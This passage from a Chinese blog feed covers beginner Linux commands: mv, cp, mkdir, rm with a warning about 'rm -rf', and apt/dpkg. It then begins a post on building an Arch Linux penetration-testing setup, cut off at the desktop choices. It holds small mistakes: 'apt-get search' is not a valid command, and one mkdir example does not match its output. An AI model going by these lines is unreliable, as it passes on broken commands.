<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$ mv ./文本.txt ./b/c/
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后，文件就被移动了</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来我们回到<code>/tmp/a/b/c/</code>下面看看吧。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$ <span class="nb">cd</span> ./b/c
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ ls
</span></span><span class="line"><span class="cl"><span class="m">223333</span>  文本.txt  <span class="nb">test</span>  wiaori
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>看到了没有，它又回来了。</p>
<h3 id="cp命令">cp命令</h3>
<p>哈哈，这个命令也不是那个cp的意思，它是  <strong>“copy”</strong> 的缩写，复制的意思。</p>
<p>顾名思义，它的作用就是把一个文件复制到另一个地方。它同样有指定绝对路径和相对路径的两种用法。来尝试一下？</p>
<h4 id="用法-4">用法</h4>
<h5 id="绝对路径">绝对路径：</h5>
<p>我们来试试把<code>/tmp/a/b/c/文本.txt</code>这个文件复制到<code>/tmp/a/</code>下面</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ cp /tmp/a/b/c/文本.txt /tmp/a/
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后，文件就被复制了</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ <span class="nb">cd</span> ../.. <span class="c1"># 我们来看看它是否被复制成功</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$ ls -lh <span class="c1"># 使用ls命令看一下，可见他是被复制成功的，创建日期与上面不一样。</span>
</span></span><span class="line"><span class="cl">总用量 4.0K
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel <span class="m">11</span>  8月  <span class="m">5</span> 18:36 文本.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> weepingdogel weepingdogel <span class="m">60</span>  8月  <span class="m">5</span> 17:37 b
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>注意：此命令如果不使用高级用法是无法复制创建时间和所有者的</p>
</blockquote>
<h5 id="相对路径">相对路径：</h5>
<p>嘿嘿，我们尝试给/tmp/a/的每一级目录都复制一份吧。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$ cp ./文本.txt ./b/ <span class="c1"># 先复制到目录b</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$ cp ./文本.txt ./b/c/ <span class="c1"># 复制到目录c</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$ cp ./文本.txt ../ <span class="c1"># 复制到/tmp/下面</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$ <span class="nb">cd</span> .. <span class="c1"># 回到/tmp下面</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost tmp<span class="o">]</span>$ ls -lh <span class="c1"># 查看是否复制成功，可见第一个就是该文件</span>
</span></span><span class="line"><span class="cl">总用量 4.0K
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel <span class="m">11</span>  8月  <span class="m">5</span> 18:48  文本.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> weepingdogel weepingdogel <span class="m">80</span>  8月  <span class="m">5</span> 18:36  a
</span></span><span class="line"><span class="cl"><span class="c1"># 接下来一级一级往下看</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost tmp<span class="o">]</span>$ ls -lh ./a
</span></span><span class="line"><span class="cl">总用量 4.0K
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel <span class="m">11</span>  8月  <span class="m">5</span> 18:36 文本.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> weepingdogel weepingdogel <span class="m">80</span>  8月  <span class="m">5</span> 18:45 b
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost tmp<span class="o">]</span>$ ls -lh ./a/b
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">11</span>  8月  <span class="m">5</span> 18:45 文本.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> weepingdogel weepingdogel <span class="m">120</span>  8月  <span class="m">5</span> 18:25 c
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost tmp<span class="o">]</span>$ ls -lh ./a/b/c
</span></span><span class="line"><span class="cl">总用量 4.0K
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 <span class="m">223333</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel <span class="m">11</span>  8月  <span class="m">5</span> 18:47 文本.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 17:52 <span class="nb">test</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 wiaori
</span></span></code></pre></td></tr></table>
</div>
</div><p>可见，复制是成功的。</p>
<blockquote>
<p>注意：如果要复制目录，请在指定目录前加上参数-r，否则将无法复制</p>
</blockquote>
<h2 id="mkdir命令">mkdir命令</h2>
<p>这个命令是 <strong>“make directory”</strong> 的缩写，意为创建一个目录它一般情况下有两种用法</p>
<ol>
<li>一般创建，直接在已存在的绝对路径或相对路径创建一个目录</li>
<li>递归创建，创建一连串目录，在创建之前有一级或以上的目录未被创建</li>
</ol>
<p>同样也是可以指定绝对路径和相对路径的，接下来我就只写出相对路径的示例了，因为方便。</p>
<p>来尝试一下？</p>
<h3 id="用法-5">用法</h3>
<h4 id="一般创建">一般创建</h4>
<p>假设目录<code>/tmp/a/b/c</code></p>
<p>我们要创建一个目录<code>d</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ mkdir ./d <span class="c1"># 在/tmp/a/b/c/下面创建一个目录d</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车之后，目录就创建了，我们可以用ls来检查一下</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ ls -lh
</span></span><span class="line"><span class="cl">总用量 4.0K
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 <span class="m">223333</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel <span class="m">11</span>  8月  <span class="m">5</span> 18:47 文本.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 19:07 d
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 17:52 <span class="nb">test</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 wiaori
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>可见，目录被成功创建了。</p>
<h4 id="递归创建">递归创建</h4>
<p>假设目录<code>/tmp/a/b/c</code></p>
<p>我们要在当前目录下创建一串目录，比如<code>./go/for/it</code>，此时我们就要加个参数<code>-p</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ mkdir -p ./go/fot/it
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车之后，一串目录就被创建了，接下来我们会一级一级的查看</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ ls -lh 
</span></span><span class="line"><span class="cl">总用量 4.0K
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 <span class="m">223333</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel <span class="m">11</span>  8月  <span class="m">5</span> 18:47 文本.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 19:07 d
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> weepingdogel weepingdogel <span class="m">60</span>  8月  <span class="m">5</span> 19:14 go
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 17:52 <span class="nb">test</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 wiaori
</span></span><span class="line"><span class="cl"><span class="c1"># 可见我们看见了目录go</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ <span class="nb">cd</span> ./go <span class="c1"># 我们试着进入这个目录，可见我们成功进入了目录</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost go<span class="o">]</span>$ ls -lh <span class="c1">#继续查看下一级</span>
</span></span><span class="line"><span class="cl">总用量 <span class="m">0</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> weepingdogel weepingdogel <span class="m">60</span>  8月  <span class="m">5</span> 19:14 <span class="k">for</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost go<span class="o">]</span>$ <span class="nb">cd</span> ./for <span class="c1">#进入目录for</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost <span class="k">for</span><span class="o">]</span>$ ls -lh <span class="c1"># 继续查看下一级</span>
</span></span><span class="line"><span class="cl">总用量 <span class="m">0</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 19:14 it
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost <span class="k">for</span><span class="o">]</span>$ <span class="nb">cd</span> ./it <span class="c1">#接下来我们进入这个目录it，由于it里面是空的，所以就不用ls查看了</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost it<span class="o">]</span>$ <span class="nb">pwd</span> <span class="c1">#使用pwd查看当前位置</span>
</span></span><span class="line"><span class="cl">/tmp/a/b/c/go/for/it
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost it<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>可见这一串目录也创建成功了。</p>
<h2 id="rm命令">rm命令</h2>
<blockquote>
<p>注意:此命令如果使用不当十分危险</p>
</blockquote>
<p>这个命令是 <strong>“remove”</strong> 的缩写，意为删除，作用上和windows中的del命令差不多，但是用法和参数却有所不同，而且诶这个命令如果使用不当是十分危险的，因为在Linux中，就算是正在被使用的文件也可以被删除，并不会有windows那种保姆级别的”拒绝访问”。</p>
<h3 id="用法-6">用法</h3>
<p>假设目录<code>/tmp/a/b/c</code></p>
<h4 id="删除文件">删除文件</h4>
<p>我们来尝试删除一下<code>文本.txt</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ rm ./文本.txt
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车之后这个文件就被删除了</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ ls
</span></span><span class="line"><span class="cl"><span class="m">223333</span>  d  go  <span class="nb">test</span>  wiaori
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="删除目录">删除目录</h4>
<p>如果你要删除一个目录，比如go，就需要加一个参数-r</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ rm -r ./go
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车之后，这个目录就被删除了</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ ls -lh <span class="c1">#查看一下就可以看到，go也不见了</span>
</span></span><span class="line"><span class="cl">总用量 <span class="m">0</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 <span class="m">223333</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 19:07 d
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 17:52 <span class="nb">test</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 wiaori
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="强制删除危险">强制删除|危险|</h4>
<p>如果你需要强制删除一个文件，则需要调用root权限，并且使用<code>-rf</code>参数。</p>
<blockquote>
<p>注意，千万不要用这个命令去删除 <code>/</code>目录，否则你的系统将会自杀</p>
</blockquote>
<p>比如我们要删除<code>223333</code>这个文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ sudo rm -rf ./223333
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后会要你输入一次密码，输入密码后按回车，这个文件就删除了，Linux的安全保护机制使密码不会显示在屏幕上</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> weepingdogel 的密码：
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ ls -lh <span class="c1"># 查看一下文件的情况，可见这个文件不见了</span>
</span></span><span class="line"><span class="cl">总用量 <span class="m">0</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 19:07 d
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 17:52 <span class="nb">test</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 wiaori
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="包管理器">包管理器</h2>
<blockquote>
<p>注意：不同发行版之间可能有差异</p>
</blockquote>
<p>一般情况下，新手使用的<strong>deb系发行版</strong>的包管理器是<strong>apt</strong></p>
<p>那么这些就是<strong>apt</strong>常用的用法了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost ~<span class="o">]</span>$ sudo apt-get update <span class="c1"># 更新软件源</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ sudo apt-get install &lt;包名&gt; <span class="c1"># 安装一个软件、软件包</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ sudo apt-get search &lt;软件名称&gt; <span class="c1"># 搜索软件</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ sudo apt-get upgrade <span class="c1"># 升级你已安装的软件，通常消耗时间比较长</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ sudo apt-get remove &lt;包名&gt; <span class="c1"># 卸载软件</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ sudo apt-get autoremove <span class="c1"># 自动处理依赖</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">如果要安装本地包，则需要使用本地包管理器dpkg，用法如下
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ sudo dpkg -i &lt;包名&gt; <span class="c1"># 安装本地包</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="结语">结语</h2>
<p>本期博客中的内容并不是很详细，我已经尽力写得让大多数人能看懂，也许还有少数人无法理解内容，没关系，你可以在下面的评论区提问。</p>
<p>那么，欢迎评论。</p>
]]></description>
</item><item>
    <title>用 Arch Linux 打造完美渗透环境</title>
    <link>http://weepingdogel.github.io/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/</link>
    <pubDate>Wed, 31 Jul 2019 21:19:52 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/images/wallhaven-nky7y7.png" referrerpolicy="no-referrer">
            </div><h2 id="简介arch-linux">简介Arch Linux</h2>
<p>Arch Linux是一款通用x86_64的GNU/Linux发行版，它采用滚动更新模式，尽全力给用户提供最新的稳定版软件。</p>
<blockquote>
<p>嘿嘿，很久不滚可能会滚挂哦</p>
</blockquote>
<p>刚装完的Arch只是一个基本系统，什么都没有，随后用户就可以根据自己的想法和喜好，安装自己需要的软件，然后通过高度自定义的配置，打造自己喜欢的、理想的系统。这也是Arch的可爱和有吸引力之处。所以Arch也是我最喜欢的发行版之一。</p>
<p>关于Arch Linux的更多详细内容，请参见<a href="https://wiki.archlinux.org/index.php/Arch_Linux_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Arch Wiki</a>。</p>
<h2 id="本期内容介绍">本期内容介绍</h2>
<p>本期将会演示如何用Arch Linux打造完美的渗透环境。一切操作均为教程演示，请读者根据实际情况操作。没使用过Arch Linux的用户请<strong>谨慎操作</strong>，并仔细查阅<a href="https://wiki.archlinux.org/index.php/Main_page_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Arch Wiki</a>。</p>
<p>那么，开始本期的内容吧。</p>
<h3 id="提示">提示</h3>
<p>本期博客会大量使用Arch Wiki的超链接，以方便理解部分内容。</p>
<h2 id="准备工作">准备工作</h2>
<h3 id="安装arch-linux">安装Arch Linux</h3>
<p>本期博客不会详细写出Arch Linux的安装过程，请参考<a href="https://wiki.archlinux.org/index.php/Installation_guide_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Arch Wiki</a>安装Arch Linux，并做好基本的配置工作。</p>
<h3 id="选择轻量桌面环境">选择轻量桌面环境</h3>
<p>由于渗透测试中部分操作会占用大量的资源，所以请尽量按需求选择轻量的桌面环境，这里不建议使用 <a href="https://wiki.archlinux.org/index.php/GNOME_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Gnome</a> 和 <a href="https://wiki.archlinux.org/index.php/KDE_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">KDE</a>，因为二者占用的资源非常大，对低配用户不友好。</p>
<ol>
<li><a href="https://wiki.archlinux.org/index.php/LXDE_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">LXDE</a></li>
</ol>
<ul>
<li>轻量级GTK桌面环境，默认窗口管理器是 <a href="https://wiki.archlinux.org/index.php/Openbox_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">OpenBox</a> ，最轻量的桌面环境之一。</li>
</ul>
<ol start="2">
<li><a href="https://wiki.archlinux.org/index.php/LXQt_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">LXQT</a></li>
</ol>
<ul>
<li>2013年间，洪任諭（“PCMan”）启动了将 LXDE 移植到 Qt 的项目。所以LXQT相当于是使用QT的LXDE，默认窗口管理器还是 <a href="https://wiki.archlinux.org/index.php/Openbox_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">OpenBox</a> ，它比上面的LXDE还要轻量。</li>
</ul>
<ol start="3">
<li><a href="https://wiki.archlinux.org/index.php/Xfce_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">xfce4</a></li>
</ol>
<ul>
<li>目前我在用的桌面环境，基于GTK+2，这个是轻量化桌面环境中最好看的一个了。</li>
</ul>
<ol start="4">
<li><a href="https://wiki.archlinux.org/index.php/I3_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">i3wm</a></li>
</ol>
<ul>
<li>i3 是一种动态的<a href="https://en.wikipedia.org/wiki/Tiling_window_manager" target="_blank" rel="noopener noreffer">平铺式窗口管理器</a>，其灵感来自于面向开发者与资深用户的 <a href="https://wiki.archlinux.org/index.php/Wmii" target="_blank" rel="noopener noreffer">wmii</a>。 i3 的既定目标包括清晰可读的文档，完善的多显示器支持，基于树形结构的窗口管理，提供 <a href="https://wiki.archlinux.org/index.php/Vim" target="_blank" rel="noopener noreffer">vim</a> 式的多种操作模式。 ——摘自<a href="https://wiki.archlinux.org/index.php/I3_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Arch Wiki</a>。</li>
</ul>
<ol start="5">
<li>自己DIY桌面环境</li>
</ol>
<ul>
